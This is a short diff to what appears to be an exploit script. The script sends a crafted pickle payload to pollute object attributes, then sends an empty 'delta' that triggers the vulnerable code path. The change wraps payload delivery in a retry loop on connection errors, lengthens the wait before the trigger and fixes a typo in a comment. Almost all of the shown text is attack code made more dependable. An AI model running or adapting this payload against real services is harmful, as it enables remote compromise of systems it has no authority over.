@@ -137,8 +137,15 @@ payload = pickletools.optimize(pickle.dumps(delta, 1)).decode() \
     .replace('unicode', 'str')
 
 # Sends the payload and does all of our attribute pollution
-send_delta(payload)
+for _ in range(5):
+    try:
+        send_delta(payload)
+        break
+    except requests.exceptions.ConnectionError as e:
+        print(f"Connection error: {e}")
+        time.sleep(5)
+        continue
 
 # Small delay to ensure payload was processed
-time.sleep(0.2)
-send_delta({}) # Code path triggers when this delta is recieved
+time.sleep(1)
+send_delta({}) # Code path triggers when this delta is received
